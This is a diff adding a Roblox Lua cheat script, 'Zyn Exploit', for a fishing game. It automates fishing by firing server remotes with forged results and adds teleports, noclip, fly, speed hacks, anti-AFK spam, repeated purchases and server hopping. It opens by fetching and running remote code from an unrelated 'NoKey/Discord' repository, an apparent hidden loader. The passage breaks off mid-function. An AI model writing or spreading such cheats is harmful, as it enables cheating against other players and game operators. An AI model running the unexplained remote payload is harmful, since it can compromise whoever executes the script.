@@ -1,0 +1,1509 @@
+-- sorry 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifierr/NoKey/refs/heads/main/Discord",true))()
+
+if getgenv().zynganteng then
+    warn("zyn ganteng: Already executed!")
+else
+    getgenv().zynganteng = true
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+    local vu1 = loadstring(game:HttpGet("https://raw.githubusercontent.com/x2zu/OPEN-SOURCE-UI-ROBLOX/refs/heads/main/X2ZU%20UI%20ROBLOX%20OPEN%20SOURCE/DummyUi-leak-by-x2zu/fetching-main/Tools/Framework.luau"))():Window({
+        Title = "Zyn Exploit",
+        Desc = "by zynn ganteng",
+        Icon = 105059922903197,
+        Theme = "Dark",
+        Config = {
+            Keybind = Enum.KeyCode.LeftControl,
+            Size = UDim2.new(0, 500, 0, 400)
+        },
+        CloseUIButton = {
+            Enabled = true,
+            Text = "Close"
+        }
+    })
+    local v2 = game:GetService("Players")
+    local vu3 = game:GetService("ReplicatedStorage")
+    local vu4 = game:GetService("VirtualInputManager")
+    local vu5 = game:GetService("VirtualUser")
+    local vu6 = game:GetService("HttpService")
+    local vu7 = game:GetService("GuiService")
+    local vu8 = game:GetService("RunService")
+    local vu9 = game:GetService("Workspace")
+    local vu10 = game:GetService("UserInputService")
+    local vu11 = game:GetService("PathfindingService")
+    game:GetService("TweenService")
+    local vu12 = game:GetService("ProximityPromptService")
+    local vu13 = v2.LocalPlayer
+    local vu14 = (vu13.Character or vu13.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
+    local vu15 = vu13:WaitForChild("PlayerGui")
+    local vu16 = vu13:WaitForChild("Backpack")
+    local vu17 = "Normal"
+    local vu18 = "Navigation"
+    local vu19 = "Blatant"
+    local vu20 = "Sell All"
+    local vu21 = "Common"
+    local vu22 = 60
+    local vu23 = nil
+    local vu24 = "Ocean"
+    local v25 = {}
+    local vu26 = false
+    local vu27 = "Ocean"
+    local vu28 = false
+    local vu29 = false
+    local vu30 = false
+    local vu31 = false
+    local vu32 = false
+    local vu33 = false
+    local vu34 = false
+    local vu35 = false
+    local vu36 = false
+    local vu37 = false
+    local vu38 = false
+    local vu39 = false
+    local vu40 = false
+    local vu41 = nil
+    local vu42 = nil
+    local vu43 = nil
+    local vu44 = nil
+    local vu45 = nil
+    local vu46 = nil
+    local vu47 = nil
+    local function vu51(p48, p49, p50)
+        vu1:Notify({
+            Title = p48,
+            Content = p49,
+            Time = p50 or 5
+        })
+    end
+    local function vu54(p52)
+        local v53 = vu16:FindFirstChild(tostring(p52)) and vu16:FindFirstChild(tostring(p52))
+        if v53 then
+            vu13.Character.Humanoid:EquipTool(v53)
+        end
+    end
+    local function vu57()
+        local v55 = vu13.Character
+        if v55 then
+            v55 = vu13.Character:FindFirstChildWhichIsA("Tool")
+        end
+        if v55 then
+            local v56 = v55.Name:lower():find("rod")
+            if not v56 then
+                v55 = v56
+            end
+        end
+        return v55
+    end
+    local function vu61()
+        while vu31 do
+            local v58 = vu57()
+            if v58 and v58:FindFirstChild("events") then
+                if vu17 ~= "Legit" then
+                    if vu17 == "Blatant" then
+                        v58.events.cast:FireServer(99, 1)
+                    end
+                else
+                    vu4:SendMouseButtonEvent(0, 0, 0, true, vu13, 0)
+                    vu14.ChildAdded:Connect(function(pu59)
+                        if pu59.Name == "power" and pu59:FindFirstChild("powerbar") and pu59.powerbar:FindFirstChild("bar") then
+                            pu59.powerbar.bar.Changed:Connect(function(p60)
+                                if p60 == "Size" and pu59.powerbar.bar.Size == UDim2.new(1, 0, 1, 0) then
+                                    vu4:SendMouseButtonEvent(0, 0, 0, false, vu13, 0)
+                                end
+                            end)
+                        end
+                    end)
+                end
+            end
+            task.wait(0.5)
+        end
+    end
+    local function vu68()
+        if vu18 ~= "Navigation" then
+            if vu18 == "Mouse" then
+                local v62 = vu15:FindFirstChild("shakeui")
+                local v63 = v62 and v62:FindFirstChild("safezone") and v62.safezone:FindFirstChild("button")
+                if v63 then
+                    local v64 = v63.AbsolutePosition
+                    local v65 = v63.AbsoluteSize
+                    vu4:SendMouseButtonEvent(v64.X + v65.X / 2, v64.Y + v65.Y / 2, 0, true, vu13, 0)
+                    vu4:SendMouseButtonEvent(v64.X + v65.X / 2, v64.Y + v65.Y / 2, 0, false, vu13, 0)
+                end
+            end
+        else
+            local v66 = vu15:FindFirstChild("shakeui")
+            local v67 = v66 and v66:FindFirstChild("safezone") and v66.safezone:FindFirstChild("button")
+            if v67 then
+                task.wait(0.2)
+                vu7.SelectedObject = v67
+                if vu7.SelectedObject == v67 then
+                    vu4:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                    vu4:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+                end
+                task.wait(0.1)
+                vu7.SelectedObject = nil
+            end
+        end
+    end
+    local function vu69()
+        if not vu41 and vu32 then
+            vu41 = vu8.RenderStepped:Connect(vu68)
+        end
+    end
+    local function vu70()
+        if vu41 then
+            vu41:Disconnect()
+            vu41 = nil
+        end
+    end
+    local function vu74()
+        local v71 = vu15:FindFirstChild("reel")
+        if v71 then
+            local v72 = v71:FindFirstChild("bar")
+            local v73
+            if v72 then
+                v73 = v72:FindFirstChild("playerbar")
+            else
+                v73 = v72
+            end
+            if v72 then
+                v72 = v72:FindFirstChild("fish")
+            end
+            if v73 and v72 then
+                v73.Position = v72.Position
+            end
+        end
+    end
+    local function vu76()
+        if vu19 ~= "Legit" then
+            if vu19 == "Blatant" then
+                local v75 = vu15:FindFirstChild("reel")
+                if v75 and v75:FindFirstChild("bar") then
+                    vu3:WaitForChild("events"):WaitForChild("reelfinished"):FireServer(100, false)
+                end
+            end
+        else
+            if vu42 or not vu33 then
+                return
+            end
+            vu42 = vu8.RenderStepped:Connect(vu74)
+        end
+    end
+    local function vu77()
+        if vu42 then
+            vu42:Disconnect()
+            vu42 = nil
+        end
+    end
+    local function v81()
+        local v78 = vu14.CFrame
+        local v79 = CFrame.new(464, 151, 232)
+        local v80 = vu30
+        if vu30 then
+            vu30 = false
+        end
+        vu14.CFrame = v79
+        task.wait(0.5)
+        vu9:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Marc Merchant"):WaitForChild("merchant"):WaitForChild("sell"):InvokeServer()
+        task.wait(1)
+        vu14.CFrame = v78
+        if v80 then
+            vu30 = true
+            rememberPosition()
+        end
+    end
+    local function vu85()
+        local v82 = vu14.CFrame
+        local v83 = CFrame.new(464, 151, 232)
+        local v84 = vu30
+        if vu30 then
+            vu30 = false
+        end
+        vu14.CFrame = v83
+        task.wait(0.5)
+        vu3:WaitForChild("events"):WaitForChild("SellAll"):InvokeServer()
+        task.wait(1)
+        vu14.CFrame = v82
+        if v84 then
+            vu30 = true
+            rememberPosition()
+        end
+    end
+    vu13.Idled:Connect(function()
+        vu5:CaptureController()
+        vu5:ClickButton2(Vector2.new())
+    end)
+    task.spawn(function()
+        while true do
+            vu3:WaitForChild("events"):WaitForChild("afk"):FireServer(false)
+            task.wait(0.01)
+        end
+    end)
+    local vu86 = vu9:FindFirstChild("world"):WaitForChild("spawns"):WaitForChild("TpSpots")
+    local v87, v88, v89 = pairs(vu86:GetChildren())
+    local vu90 = vu18
+    local vu91 = vu31
+    local vu92 = vu15
+    local vu93 = vu33
+    local vu94 = vu57
+    local vu95 = vu32
+    local vu96 = vu14
+    local vu97 = vu16
+    local vu98 = vu17
+    local vu99 = vu19
+    local function vu113(pu100, p101)
+        local v102 = vu13.Character or vu13.CharacterAdded:Wait()
+        local v103 = v102:WaitForChild("Humanoid")
+        local vu104 = v102:WaitForChild("HumanoidRootPart")
+        local vu105 = vu11:CreatePath({
+            AgentCanJump = true,
+            AgentJumpHeight = 2,
+            AgentHeight = 6
+        })
+        if pcall(function()
+            vu105:ComputeAsync(vu104.Position, pu100)
+        end) and (vu105.Status == Enum.PathStatus.Success and p101) then
+            local v106 = vu105
+            local v107, v108, v109 = ipairs(vu105.GetWaypoints(v106))
+            while true do
+                local v110
+                v109, v110 = v107(v108, v109)
+                if v109 == nil or v103.Health <= 0 then
+                    break
+                end
+                local vu111 = false
+                local v112 = v103.MoveToFinished:Connect(function()
+                    vu111 = true
+                end)
+                v103:MoveTo(v110.Position)
+                if v110.Action == Enum.PathWaypointAction.Jump then
+                    v103:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+                repeat
+                    task.wait()
+                until vu111
+                v112:Disconnect()
+            end
+        end
+    end
+    local function v129()
+        local vu114 = game.PlaceId
+        local vu115 = {}
+        local vu116 = ""
+        local function vu128()
+            local v117 = vu116 == "" and vu6:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. vu114 .. "/servers/Public?sortOrder=Asc&limit=100")) or vu6:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. vu114 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. vu116))
+            if v117.nextPageCursor then
+                vu116 = v117.nextPageCursor
+            end
+            local v118, v119, v120 = pairs(v117.data)
+            while true do
+                local v121
+                v120, v121 = v118(v119, v120)
+                if v120 == nil then
+                    break
+                end
+                local v122 = true
+                local vu123 = tostring(v121.id)
+                if v121.maxPlayers > v121.playing then
+                    local v124, v125, v126 = pairs(vu115)
+                    while true do
+                        local v127
+                        v126, v127 = v124(v125, v126)
+                        if v126 == nil then
+                            break
+                        end
+                        if vu123 == v127 then
+                            v122 = false
+                        end
+                    end
+                    if v122 then
+                        table.insert(vu115, vu123)
+                        pcall(function()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(vu114, vu123, vu13)
+                        end)
+                        task.wait()
+                    end
+                end
+            end
+        end
+        task.spawn(function()
+            while task.wait() do
+                pcall(vu128)
+                if vu116 ~= "" then
+                    pcall(vu128)
+                end
+            end
+        end)
+    end
+    while true do
+        local v130
+        v89, v130 = v87(v88, v89)
+        if v89 == nil then
+            break
+        end
+        if not table.find(v25, v130.Name) then
+            table.insert(v25, v130.Name)
+        end
+    end
+    local v131 = vu1:Tab({
+        Title = "Fishing",
+        Icon = "anchor"
+    })
+    local v132 = vu1:Tab({
+        Title = "Market",
+        Icon = "store"
+    })
+    local v133 = vu1:Tab({
+        Title = "Teleport",
+        Icon = "map"
+    })
+    local v134 = vu1:Tab({
+        Title = "Events",
+        Icon = "calendar"
+    })
+    local v135 = vu1:Tab({
+        Title = "Automation",
+        Icon = "settings"
+    })
+    local v136 = vu1:Tab({
+        Title = "Character",
+        Icon = "user"
+    })
+    local v137 = vu1:Tab({
+        Title = "Miscellaneous",
+        Icon = "wrench"
+    })
+    local v138 = vu1:Tab({
+        Title = "Settings",
+        Icon = "settings"
+    })
+    v131:Section({
+        Title = "Fishing Automation"
+    })
+    v131:Toggle({
+        Title = "Auto Cast",
+        Desc = "Automatically cast the fishing rod",
+        Value = false,
+        Callback = function(p139)
+            vu91 = p139
+            if p139 then
+                task.spawn(vu61)
+            end
+        end
+    })
+    v131:Dropdown({
+        Title = "Cast Mode",
+        List = {
+            "Legit",
+            "Blatant",
+            "Normal",
+            "Safe Mode",
+            "Fast"
+        },
+        Value = vu98,
+        Callback = function(p140)
+            vu98 = p140
+        end
+    })
+    v131:Toggle({
+        Title = "Auto Shake",
+        Desc = "Automatically shake when needed",
+        Value = false,
+        Callback = function(p141)
+            vu95 = p141
+            if p141 then
+                vu69()
+            else
+                vu70()
+            end
+        end
+    })
+    v131:Dropdown({
+        Title = "Shake Mode",
+        List = {
+            "Navigation",
+            "Mouse"
+        },
+        Value = vu90,
+        Callback = function(p142)
+            vu90 = p142
+        end
+    })
+    v131:Toggle({
+        Title = "Auto Reel",
+        Desc = "Automatically reel in the fish",
+        Value = false,
+        Callback = function(p143)
+            vu93 = p143
+            if p143 then
+                vu76()
+            else
+                vu77()
+            end
+        end
+    })
+    v131:Dropdown({
+        Title = "Reel Mode",
+        List = {
+            "Legit",
+            "Blatant"
+        },
+        Value = vu99,
+        Callback = function(p144)
+            vu99 = p144
+        end
+    })
+    v131:Toggle({
+        Title = "Auto Catch",
+        Desc = "Automatically catch the fish",
+        Value = false,
+        Callback = function(p145)
+            vu34 = p145
+            if p145 then
+                task.spawn(function()
+                    while vu34 do
+                        local v146 = vu92:FindFirstChild("reel")
+                        if v146 and v146:FindFirstChild("bar") then
+                            vu3:WaitForChild("events"):WaitForChild("reelfinished"):FireServer(100, true)
+                        end
+                        task.wait(0.1)
+                    end
+                end)
+            end
+        end
+    })
+    v131:Toggle({
+        Title = "Auto Equip Rod",
+        Desc = "Automatically equip the fishing rod",
+        Value = false,
+        Callback = function(p147)
+            vu35 = p147
+            if p147 then
+                task.spawn(function()
+                    while vu35 do
+                        if not vu94() then
+                            vu54("Rod")
+                        end
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v131:Toggle({
+        Title = "Zone Cast",
+        Desc = "Cast to selected fishing zone",
+        Value = false,
+        Callback = function(p148)
+            vu26 = p148
+            if p148 then
+                vu13.Character.ChildAdded:Connect(function(p149)
+                    if p149:IsA("Tool") and vu9:FindFirstChild("zones"):FindFirstChild("fishing"):FindFirstChild(vu27) then
+                        p149.ChildAdded:Connect(function(pu150)
+                            if pu150.Name == "bobber" and vu26 then
+                                local v151 = pu150:FindFirstChildOfClass("RopeConstraint")
+                                if v151 then
+                                    v151.Length = math.huge
+                                end
+                                task.spawn(function()
+                                    while vu26 and pu150.Parent do
+                                        pu150.CFrame = vu9.zones.fishing[vu27].CFrame
+                                        task.wait()
+                                    end
+                                end)
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    })
+    v131:Dropdown({
+        Title = "Fishing Zone",
+        List = {
+            "Ocean",
+            "Mosslurker",
+            "Whales Pool",
+            "Mushgrove Algae Pool",
+            "Golden Tide",
+            "Isonade",
+            "Whale Shark",
+            "Great Hammerhead Shark",
+            "Great White Shark",
+            "The Depths - Serpent",
+            "Megalodon Default",
+            "The Kraken Pool",
+            "Orcas Pool",
+            "Lovestorm Eel",
+            "Forsaken Veil - Scylla"
+        },
+        Value = vu27,
+        Callback = function(p152)
+            vu27 = p152
+        end
+    })
+    v132:Section({
+        Title = "Market Interactions"
+    })
+    v132:Button({
+        Title = "Sell Hand",
+        Callback = v81
+    })
+    v132:Button({
+        Title = "Sell All",
+        Callback = vu85
+    })
+    v132:Toggle({
+        Title = "Auto Sell",
+        Desc = "Automatically sell items",
+        Value = false,
+        Callback = function(p153)
+            vu36 = p153
+            if p153 then
+                task.spawn(function()
+                    while vu36 do
+                        if vu20 ~= "Sell with Rarity" then
+                            vu85()
+                        else
+                            local v154 = vu97
+                            local v155, v156, v157 = pairs(v154:GetDescendants())
+                            while true do
+                                local v158
+                                v157, v158 = v155(v156, v157)
+                                if v157 == nil then
+                                    break
+                                end
+                                if v158:IsA("Tool") and (v158:FindFirstChild("Rarity") and v158.Rarity.Value == vu21) then
+                                    vu54(v158)
+                                    vu3:WaitForChild("events"):WaitForChild("Sell"):InvokeServer()
+                                    task.wait(vu22)
+                                end
+                            end
+                        end
+                        task.wait(vu22)
+                    end
+                end)
+            end
+        end
+    })
+    v132:Slider({
+        Title = "Auto Sell Delay",
+        Min = 1,
+        Max = 300,
+        Rounding = 0,
+        Value = vu22,
+        Callback = function(p159)
+            vu22 = p159
+        end
+    })
+    v132:Dropdown({
+        Title = "Sell Method",
+        List = {
+            "Sell with Rarity",
+            "Sell All"
+        },
+        Value = vu20,
+        Callback = function(p160)
+            vu20 = p160
+        end
+    })
+    v132:Dropdown({
+        Title = "Rarity",
+        List = {
+            "Common",
+            "Uncommon",
+            "Rare",
+            "Epic",
+            "Legendary"
+        },
+        Value = vu21,
+        Callback = function(p161)
+            vu21 = p161
+        end
+    })
+    v133:Section({
+        Title = "Teleport Locations"
+    })
+    v133:Dropdown({
+        Title = "Area Teleport",
+        List = v25,
+        Value = nil,
+        Callback = function(p162)
+            if p162 then
+                vu96.CFrame = vu86:FindFirstChild(p162).CFrame + Vector3.new(0, 5, 0)
+            end
+        end
+    })
+    v133:Dropdown({
+        Title = "Totem Teleport",
+        List = {
+            "Aurora",
+            "Sundial",
+            "Windset",
+            "Smokescreen",
+            "Tempest"
+        },
+        Value = nil,
+        Callback = function(p163)
+            if p163 == "Aurora" then
+                vu96.CFrame = CFrame.new(- 1811, - 137, - 3282)
+            elseif p163 == "Sundial" then
+                vu96.CFrame = CFrame.new(- 1148, 135, - 1075)
+            elseif p163 == "Windset" then
+                vu96.CFrame = CFrame.new(2849, 178, 2702)
+            elseif p163 == "Smokescreen" then
+                vu96.CFrame = CFrame.new(2789, 140, - 625)
+            elseif p163 == "Tempest" then
+                vu96.CFrame = CFrame.new(35, 133, 1943)
+            end
+        end
+    })
+    v133:Dropdown({
+        Title = "World Event Teleport",
+        List = {
+            "Strange Whirlpool",
+            "Great Hammerhead Shark",
+            "Great White Shark",
+            "Whale Shark",
+            "The Depths - Serpent"
+        },
+        Value = nil,
+        Callback = function(p164)
+            local v165 = Vector3.new(0, 135, 0)
+            if p164 == "Strange Whirlpool" then
+                local v166 = Vector3.new(25, 135, 25)
+                local v167 = vu9.zones.fishing:FindFirstChild("Isonade")
+                if v167 then
+                    vu96.CFrame = CFrame.new(v167.Position + v166)
+                else
+                    vu51("Teleport Failed", "Strange Whirlpool not found")
+                end
+            elseif p164 == "Great Hammerhead Shark" then
+                local v168 = vu9.zones.fishing:FindFirstChild("Great Hammerhead Shark")
+                if v168 then
+                    vu96.CFrame = CFrame.new(v168.Position + v165)
+                else
+                    vu51("Teleport Failed", "Great Hammerhead Shark not found")
+                end
+            elseif p164 == "Great White Shark" then
+                local v169 = vu9.zones.fishing:FindFirstChild("Great White Shark")
+                if v169 then
+                    vu96.CFrame = CFrame.new(v169.Position + v165)
+                else
+                    vu51("Teleport Failed", "Great White Shark not found")
+                end
+            elseif p164 == "Whale Shark" then
+                local v170 = vu9.zones.fishing:FindFirstChild("Whale Shark")
+                if v170 then
+                    vu96.CFrame = CFrame.new(v170.Position + v165)
+                else
+                    vu51("Teleport Failed", "Whale Shark not found")
+                end
+            elseif p164 == "The Depths - Serpent" then
+                local v171 = Vector3.new(0, 50, 0)
+                local v172 = vu9.zones.fishing:FindFirstChild("The Depths - Serpent")
+                if v172 then
+                    vu96.CFrame = CFrame.new(v172.Position + v171)
+                else
+                    vu51("Teleport Failed", "The Depths - Serpent not found")
+                end
+            end
+        end
+    })
+    v133:Button({
+        Title = "Teleport to Traveler Merchant",
+        Callback = function()
+            local v173 = vu9.active:FindFirstChild("Merchant Boat")
+            if v173 then
+                vu96.CFrame = CFrame.new(v173.Boat["Merchant Boat"].r.HandlesR.Position)
+            else
+                vu51("Teleport Failed", "Merchant not found")
+            end
+        end
+    })
+    v133:Button({
+        Title = "Create Safe Zone",
+        Callback = function()
+            local v174 = Instance.new("Part")
+            v174.Size = Vector3.new(30, 1, 30)
+            v174.Position = Vector3.new(math.random(- 2000, 2000), math.random(50000, 90000), math.random(- 2000, 2000))
+            v174.Anchored = true
+            v174.BrickColor = BrickColor.new("Bright purple")
+            v174.Material = Enum.Material.ForceField
+            v174.Parent = vu9
+            vu96.CFrame = v174.CFrame + Vector3.new(0, 5, 0)
+        end
+    })
+    v133:Button({
+        Title = "Setup Position",
+        Callback = function()
+            vu23 = vu96.CFrame
+            vu51("Position Saved", "Teleport position set")
+        end
+    })
+    v133:Toggle({
+        Title = "Teleport to Saved Position",
+        Value = false,
+        Callback = function(pu175)
+            if pu175 and vu23 then
+                task.spawn(function()
+                    while pu175 do
+                        vu96.CFrame = vu23
+                        task.wait()
+                    end
+                end)
+            end
+        end
+    })
+    v134:Section({
+        Title = "Event Handling"
+    })
+    v134:Toggle({
+        Title = "Whale Hunting",
+        Value = false,
+        Callback = function(p176)
+            vu37 = p176
+            if p176 then
+                task.spawn(function()
+                    while vu37 do
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v134:Toggle({
+        Title = "Auto Balance Nuke",
+        Value = false,
+        Callback = function(p177)
+            vu40 = p177
+            if p177 then
+                task.spawn(function()
+                    while vu40 do
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Section({
+        Title = "Automatic Actions"
+    })
+    v135:Toggle({
+        Title = "Auto Drop",
+        Value = false,
+        Callback = function(p178)
+            vu38 = p178
+            if p178 then
+                vu43 = vu8.RenderStepped:Connect(function()
+                end)
+            elseif vu43 then
+                vu43:Disconnect()
+                vu43 = nil
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Open Item",
+        Value = false,
+        Callback = function(p179)
+            vu39 = p179
+            if p179 then
+                task.spawn(function()
+                    while vu39 do
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Treasure Map",
+        Value = false,
+        Callback = function(pu180)
+            if pu180 then
+                task.spawn(function()
+                    while pu180 do
+                        if vu13.Character:FindFirstChild("Treasure Map") then
+                            vu96.CFrame = CFrame.new(- 2828.74292, 214.929657, 1520.1853)
+                            local v181 = {}
+                            local v182 = {
+                                voice = 4,
+                                idle = vu9:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Jack Marrow"):WaitForChild("description"):WaitForChild("idle"),
+                                npc = vu9:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Jack Marrow")
+                            }
+                            __set_list(v181, 1, {
+                                v182
+                            })
+                            vu9:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Jack Marrow"):WaitForChild("treasure"):WaitForChild("repairmap"):InvokeServer(unpack(v181))
+                            local v183, v184, v185 = pairs(vu9.world.chests:GetChildren())
+                            while true do
+                                local v186
+                                v185, v186 = v183(v184, v185)
+                                if v185 == nil then
+                                    break
+                                end
+                                if v186:IsA("Part") then
+                                    local v187 = v186:GetAttribute("x")
+                                    local v188 = v186:GetAttribute("y")
+                                    local v189 = v186:GetAttribute("z")
+                                    if v187 and (v188 and v189) then
+                                        vu3:WaitForChild("events"):WaitForChild("open_treasure"):FireServer({
+                                            x = v187,
+                                            y = v188,
+                                            z = v189
+                                        })
+                                    end
+                                end
+                            end
+                        else
+                            vu54("Treasure Map")
+                        end
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Complete Second Sea",
+        Value = false,
+        Callback = function(pu190)
+            if pu190 then
+                task.spawn(function()
+                    while pu190 do
+                        if vu9.PlayerStats[vu13.Name].T[vu13.Name].Stats.level.Value >= 251 and not vu9.PlayerStats[vu13.Name].T[vu13.Name].Stats:FindFirstChild("access_second_sea") then
+                            vu96.CFrame = CFrame.new(1536.48218, - 1692.60022, 6309.69141)
+                            local v191 = {
+                                voice = 2,
+                                idle = vu9:WaitForChild("CryptOfTheGreenOne"):WaitForChild("CthuluNPCs"):WaitForChild("Brother Silas"):WaitForChild("description"):WaitForChild("idle"),
+                                npc = vu9:WaitForChild("CryptOfTheGreenOne"):WaitForChild("CthuluNPCs"):WaitForChild("Brother Silas")
+                            }
+                            vu9:WaitForChild("CryptOfTheGreenOne"):WaitForChild("CthuluNPCs"):WaitForChild("Brother Silas"):WaitForChild("SilasesWarningDialog"):WaitForChild("opengate"):InvokeServer(v191)
+                            vu113(Vector3.new(1536.69995, - 1695.37805, 5896.61523), true)
+                        end
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Trident Rod",
+        Value = false,
+        Callback = function(pu192)
+            if pu192 then
+                task.spawn(function()
+                    while pu192 do
+                        vu3:WaitForChild("events"):WaitForChild("purchase"):FireServer("Trident Rod", "Rod", 1)
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Destiny Rod",
+        Value = false,
+        Callback = function(pu193)
+            if pu193 then
+                task.spawn(function()
+                    while pu193 do
+                        vu3:WaitForChild("events"):WaitForChild("purchase"):FireServer("Destiny Rod", "Rod", 1)
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Aurora Rod",
+        Value = false,
+        Callback = function(pu194)
+            if pu194 then
+                task.spawn(function()
+                    while pu194 do
+                        vu3:WaitForChild("events"):WaitForChild("purchase"):FireServer("Aurora Rod", "Rod", 1)
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Kraken Rod",
+        Value = false,
+        Callback = function(pu195)
+            if pu195 then
+                task.spawn(function()
+                    while pu195 do
+                        vu3:WaitForChild("events"):WaitForChild("purchase"):FireServer("Kraken Rod", "Rod", 1)
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v135:Toggle({
+        Title = "Auto Poseidon Rod",
+        Value = false,
+        Callback = function(pu196)
+            if pu196 then
+                task.spawn(function()
+                    while pu196 do
+                        vu3:WaitForChild("events"):WaitForChild("purchase"):FireServer("Poseidon Rod", "Rod", 1)
+                        task.wait(1)
+                    end
+                end)
+            end
+        end
+    })
+    v136:Section({
+        Title = "Character Modifications"
+    })
+    v136:Toggle({
+        Title = "Walk on Water",
+        Value = false,
+        Callback = function(p197)
+            local v198, v199, v200 = pairs(vu9.zones.fishing:GetChildren())
+            while true do
+                local v201
+                v200, v201 = v198(v199, v200)
+                if v200 == nil then
+                    break
+                end
+                if v201.Name == vu24 then
+                    v201.CanCollide = p197
+                    if v201.Name == "Ocean" then
+                        local v202, v203, v204 = pairs(vu9.zones.fishing:GetChildren())
+                        while true do
+                            local v205
+                            v204, v205 = v202(v203, v204)
+                            if v204 == nil then
+                                break
+                            end
+                            if v205.Name == "Deep Ocean" then
+                                v205.CanCollide = p197
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    })
+    v136:Dropdown({
+        Title = "Walk Zone",
+        List = {
+            "Ocean",
+            "Desolate Deep",
+            "The Depths"
+        },
+        Value = vu24,
+        Callback = function(p206)
+            vu24 = p206
+        end
+    })
+    v136:Slider({
+        Title = "Walk Speed",
+        Min = 16,
+        Max = 200,
+        Rounding = 1,
+        Value = 16,
+        Callback = function(p207)
+            vu13.Character.Humanoid.WalkSpeed = p207
+        end
+    })
+    v136:Slider({
+        Title = "Jump Height",
+        Min = 50,
+        Max = 200,
+        Rounding = 1,
+        Value = 50,
+        Callback = function(p208)
+            vu13.Character.Humanoid.JumpPower = p208
+        end
+    })
+    v136:Toggle({
+        Title = "Noclip",
+        Value = false,
+        Callback = function(p209)
+            vu29 = p209
+            if p209 then
+                task.spawn(function()
+                    while vu29 do
+                        local v210, v211, v212 = pairs(vu13.Character:GetDescendants())
+                        while true do
+                            local v213
+                            v212, v213 = v210(v211, v212)
+                            if v212 == nil then
+                                break
+                            end
+                            if v213:IsA("BasePart") then
+                                v213.CanCollide = false
+                            end
+                        end
+                        task.wait()
+                    end
+                end)
+            end
+        end
+    })
+    v136:Toggle({
+        Title = "Freeze Character",
+        Value = false,
+        Callback = function(p214)
+            vu28 = p214
+            if p214 then
+                local vu215 = vu96.CFrame
+                task.spawn(function()
+                    while vu28 do
+                        vu96.CFrame = vu215
+                        task.wait()
+                    end
+                end)
+            end
+        end
+    })
+    v136:Toggle({
+        Title = "Infinite Oxygen",
+        Value = false,
+        Callback = function(p216)
+            if vu13.Character and vu13.Character:FindFirstChild("Resources") then
+                vu13.Character.Resources.oxygen.Enabled = not p216
+                vu13.Character.Resources["oxygen(peaks)"].Enabled = not p216
+            end
+        end
+    })
+    v136:Toggle({
+        Title = "Fly",
+        Value = false,
+        Callback = function(p217)
+            if p217 then
+                local vu218 = Instance.new("BodyVelocity")
+                vu218.Name = "Velocity"
+                vu218.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                vu218.Velocity = Vector3.zero
+                vu218.P = 1250
+                vu218.Parent = vu96
+                local vu219 = Instance.new("BodyGyro")
+                vu219.Name = "Gyro"
+                vu219.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                vu219.P = 3000
+                vu219.CFrame = vu96.CFrame
+                vu219.Parent = vu96
+                local vu220 = {
+                    F = 0,
+                    B = 0,
+                    L = 0,
+                    R = 0,
+                    U = 0,
+                    D = 0
+                }
+                local vu221 = 100
+                vu45 = vu10.InputBegan:Connect(function(p222)
+                    local v223 = p222.KeyCode
+                    if v223 == Enum.KeyCode.W then
+                        vu220.F = 1
+                    end
+                    if v223 == Enum.KeyCode.S then
+                        vu220.B = 1
+                    end
+                    if v223 == Enum.KeyCode.A then
+                        vu220.L = 1
+                    end
+                    if v223 == Enum.KeyCode.D then
+                        vu220.R = 1
+                    end
+                    if v223 == Enum.KeyCode.Space then
+                        vu220.U = 1
+                    end
+                    if v223 == Enum.KeyCode.LeftControl then
+                        vu220.D = 1
+                    end
+                end)
+                vu46 = vu10.InputEnded:Connect(function(p224)
+                    local v225 = p224.KeyCode
+                    if v225 == Enum.KeyCode.W then
+                        vu220.F = 0
+                    end
+                    if v225 == Enum.KeyCode.S then
+                        vu220.B = 0
+                    end
+                    if v225 == Enum.KeyCode.A then
+                        vu220.L = 0
+                    end
+                    if v225 == Enum.KeyCode.D then
+                        vu220.R = 0
+                    end
+                    if v225 == Enum.KeyCode.Space then
+                        vu220.U = 0
+                    end
+                    if v225 == Enum.KeyCode.LeftControl then
+                        vu220.D = 0
+                    end
+                end)
+                vu44 = vu8.RenderStepped:Connect(function()
+                    local v226 = vu9.CurrentCamera
+                    local v227 = v226.CFrame.LookVector * (vu220.F - vu220.B) + v226.CFrame.RightVector * (vu220.R - vu220.L) + Vector3.new(0, 0.1, 0) * (vu220.U - vu220.D)
+                    vu218.Velocity = v227.Magnitude > 0 and v227.Unit * vu221 or Vector3.zero
+                    vu219.CFrame = CFrame.new(vu96.Position, vu96.Position + v226.CFrame.LookVector)
+                end)
+            else
+                if vu44 then
+                    vu44:Disconnect()
+                    vu44 = nil
+                end
+                if vu45 then
